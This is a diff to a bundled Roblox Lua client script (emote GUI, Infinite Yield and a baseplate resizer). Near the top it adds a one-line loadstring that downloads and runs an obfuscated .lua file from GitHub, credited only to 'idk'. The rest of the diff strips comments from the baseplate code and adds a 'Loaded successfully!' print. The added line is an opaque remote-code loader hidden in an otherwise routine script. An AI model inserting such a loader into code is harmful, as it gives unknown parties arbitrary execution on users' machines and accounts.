@@ -1,6 +1,8 @@
 --emote gui made by gi
 --infinite yield by Edge
 --dumb baseplate script made by me, osplurm<3
+--other random script made by idk
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt"))()
 local IsStudio = false
 
 local ContextActionService = game:GetService("ContextActionService")
@@ -13345,42 +13347,33 @@ local Players = game:GetService("Players")
 -- Only run this script on the client
 if not RunService:IsClient() then return end
 
-local BASEPLATE_UPDATE_THRESHOLD = 100 -- Distance from center before updating
+local BASEPLATE_UPDATE_THRESHOLD = 100 
 
--- Function to resize the baseplate and create a lower baseplate
 local function resizeBaseplate()
     local baseplate = workspace:FindFirstChild("Baseplate")
     
     if baseplate and baseplate:IsA("BasePart") then
-        -- Create a new part to replace the baseplate
         local newBaseplate = baseplate:Clone()
         newBaseplate.Name = "ClientBaseplate"
         
-        -- Set the size to a large, but not extreme, value
         local largeSize = 10000
         newBaseplate.Size = Vector3.new(largeSize, baseplate.Size.Y, largeSize)
         
-        -- Position the new baseplate at the same height as the original
         newBaseplate.Position = Vector3.new(0, baseplate.Position.Y, 0)
         
-        -- Parent the new baseplate to the workspace
         newBaseplate.Parent = workspace
         
-        -- Create a lower baseplate with the same properties
         local lowerBaseplate = newBaseplate:Clone()
         lowerBaseplate.Name = "LowerClientBaseplate"
         lowerBaseplate.Position = Vector3.new(0, baseplate.Position.Y - 500, 0)
         lowerBaseplate.Parent = workspace
         
-        -- Delete the original baseplate
         baseplate:Destroy()
     end
 end
 
--- Run the resize function
 resizeBaseplate()
 
--- Update the baseplate positions if the character moves far from the center
 local function updateBaseplatePositions()
     local character = Players.LocalPlayer.Character
     if character and character:FindFirstChild("HumanoidRootPart") then
@@ -13392,13 +13385,10 @@ local function updateBaseplatePositions()
             local offsetX = rootPart.Position.X - baseplateCenter.X
             local offsetZ = rootPart.Position.Z - baseplateCenter.Z
             
-            -- Check if character is beyond the threshold distance from the center
             if math.abs(offsetX) > BASEPLATE_UPDATE_THRESHOLD or math.abs(offsetZ) > BASEPLATE_UPDATE_THRESHOLD then
-                -- Calculate new position (round to nearest BASEPLATE_UPDATE_THRESHOLD)
                 local newX = math.floor(rootPart.Position.X / BASEPLATE_UPDATE_THRESHOLD + 0.5) * BASEPLATE_UPDATE_THRESHOLD
                 local newZ = math.floor(rootPart.Position.Z / BASEPLATE_UPDATE_THRESHOLD + 0.5) * BASEPLATE_UPDATE_THRESHOLD
                 
-                -- Update positions
                 clientBaseplate.Position = Vector3.new(newX, clientBaseplate.Position.Y, newZ)
                 lowerClientBaseplate.Position = Vector3.new(newX, lowerClientBaseplate.Position.Y, newZ)
             end
@@ -13408,3 +13398,4 @@ end
 
 RunService.Heartbeat:Connect(updateBaseplatePositions)
 workspace.FallenPartsDestroyHeight = -1e38
+print("Loaded successfully!")
